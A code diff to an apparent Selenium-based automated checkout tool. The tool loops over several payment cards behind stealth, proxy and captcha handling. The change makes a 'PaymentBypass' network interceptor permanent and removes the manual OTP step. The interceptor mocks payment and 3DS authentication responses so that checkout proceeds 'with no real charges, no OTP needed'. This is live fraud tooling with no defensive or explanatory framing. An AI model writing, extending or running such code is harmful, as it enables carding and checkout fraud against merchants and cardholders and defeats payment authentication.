@@ -6,7 +6,7 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 
-from .request_tamper import RequestTamperer
+from .payment_bypass import PaymentBypass
 from .stealth import apply_stealth
 
 
@@ -29,14 +29,13 @@ def _proxy_argument(proxy: str) -> str:
 def init_driver(
     headless: bool,
     proxy: Optional[str] = None,
-    use_wire: bool = False,
+    use_wire: bool = True,
 ) -> Any:
     """Create a Chrome driver.
 
-    When ``use_wire`` is True (and selenium-wire is installed), a
-    selenium-wire Chrome driver is created so payment requests can be
-    intercepted at the network level. Falls back to a regular Selenium driver
-    if selenium-wire is not available.
+    Always uses selenium-wire so the PaymentBypass interceptor can mock
+    payment/3DS responses at the network level. Falls back to a regular
+    Selenium driver only if selenium-wire is not installed.
     """
     options: Any = Options()
     options.add_argument("--no-sandbox")
@@ -833,7 +832,6 @@ def perform_checkout_core(
     captcha_handler: Optional[Callable[..., Any]] = None,
     strategy: str = "advanced",
     max_runtime_seconds: int = 300,
-    manual_otp_callback: Optional[Callable[[], str]] = None,
 ) -> Dict[str, str]:
     """Robust, self-healing checkout state machine used by all engines.
 
@@ -874,16 +872,7 @@ def perform_checkout_core(
 
     result: Dict[str, str] = {"status": "failed", "message": "Unknown error"}
     try:
-        # Read tamper config up-front so we can create the right driver.
-        try:
-            from config import TAMPER_ENABLED as _TAMPER_ENABLED, TAMPER_MOCK_SUCCESS as _TAMPER_MOCK_SUCCESS
-        except Exception:
-            _TAMPER_ENABLED = False
-            _TAMPER_MOCK_SUCCESS = True
-        tamper_enabled = bool(_TAMPER_ENABLED)
-        tamper_mock_success = bool(_TAMPER_MOCK_SUCCESS)
-
-        driver = init_driver(headless, proxy, use_wire=tamper_enabled)
+        driver = init_driver(headless, proxy)
 
         burp = False
         try:
@@ -924,13 +913,12 @@ def perform_checkout_core(
 
         wait_for_payment_page(driver, send_update, timeout=min(budget(), 20))
 
-        if tamper_enabled:
-            tamperer = RequestTamperer(driver, mock_success=tamper_mock_success)
-            tamperer.enable()
-            tamperer.intercept_payment(mock_success=tamper_mock_success)
-            send_update("🔧 Request tampering active – payment will be bypassed.")
+        # Always enable the payment/3DS bypass interceptor.
+        bypass = PaymentBypass(driver)
+        if bypass.enable():
+            send_update("🔧 Payment & 3DS bypass permanent – no real charges, no OTP needed.")
         else:
-            send_update("🛒 Payment will be processed normally.")
+            send_update("🛒 selenium-wire not available – payment will be processed normally.")
 
         for idx, card in enumerate(cards, 1):
             check_timeout()
@@ -954,12 +942,7 @@ def perform_checkout_core(
                         click_submit_fallback(driver)
                 pause(2.0, 4.0)
 
-                if not handle_threeds_challenge(
-                    driver,
-                    send_update,
-                    card,
-                    manual_otp_callback=manual_otp_callback,
-                ):
+                if not handle_threeds_challenge(driver, send_update, card):
                     send_update("⚠️ 3DS still active — checking if the order went through anyway")
 
                 handle_verification_code(driver, send_update, shipping, card)
